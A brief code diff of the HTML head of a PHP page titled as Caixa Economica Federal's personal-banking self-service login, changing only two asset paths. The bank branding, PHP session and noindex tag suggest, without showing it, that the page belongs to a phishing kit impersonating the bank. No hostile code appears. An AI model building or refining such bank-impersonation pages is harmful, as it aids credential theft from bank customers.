@@ -10,7 +10,7 @@ session_start();
     <meta name="robots" content="noindex, nofollow, noimageindex">
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     <title>Caixa Economica Federal - Autoatendimento Pessoa Fisica</title>
-    <link rel="stylesheet" type="text/css" href="../assets/css/identificacao.css" />
+    <link rel="stylesheet" type="text/css" href="../../assets/css/identificacao.css" />
 
     <!-- CSS -->
     <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css" />
@@ -21,7 +21,7 @@ session_start();
     <!-- Bootstrap theme -->
     <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/bootstrap.min.css" />
 
-    <link rel="icon" href="../assets/imgs/favicon.ico" type="image/x-icon" />
+    <link rel="icon" href="../../assets/imgs/favicon.ico" type="image/x-icon" />
     <meta name="csrf-token" content="xxvap9tMfNDJBQEcQpXQNS9VkzSHgMwXkX5p7IIa" />
 
     <style>
